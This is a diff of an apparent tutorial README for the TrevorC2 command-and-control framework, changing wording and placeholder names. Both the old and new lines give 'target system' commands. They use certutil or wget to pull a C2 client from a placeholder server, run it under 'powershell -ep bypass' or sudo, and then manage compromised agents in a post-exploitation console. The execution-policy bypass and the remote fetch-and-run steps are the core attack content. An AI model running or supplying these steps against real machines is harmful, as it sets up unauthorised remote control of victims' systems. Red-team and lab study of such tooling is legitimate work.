@@ -72,33 +72,33 @@ python3 -m http.server 8000
 ```
 
 ## 🎯 Target System Execution
-# Option A: Windows Environment (PowerShell)
+# Option A: Windows (Powershell) 
 
 ```bash
 cd Desktop
-certutil -urlcache -f http://<CONTROLLER_IP>:8000/trevorc2_client.ps1 client.ps1
+certutil -urlcache -f http://<C2_SERVER_IP>:8000/trevorc2_client.ps1 client.ps1
 powershell -ep bypass
 .\client.ps1
 ```
 
-# Option B: Linux Environment (Bash)
+# Option B: Linux (Bash)
 
 ```bash
 cd ~/Desktop
-wget http://<CONTROLLER_IP>:8000/trevorc2.py
-sudo python3 trevorc2.py
+wget http://<C2_SERVER_IP>:8000/trevorc2_client.py
+sudo python3 trevorc2_client.py
 ```
 
 ## 🎮 Post-Exploitation Interaction
 Once the connection is established, manage the session through the server console.
 
-List all active agents:
+# List all active agents:
 
 ```bash
 list
 ```
 
-Interact with a session:
+# Interact with a session:
 
 ```bash
 interact <ID>
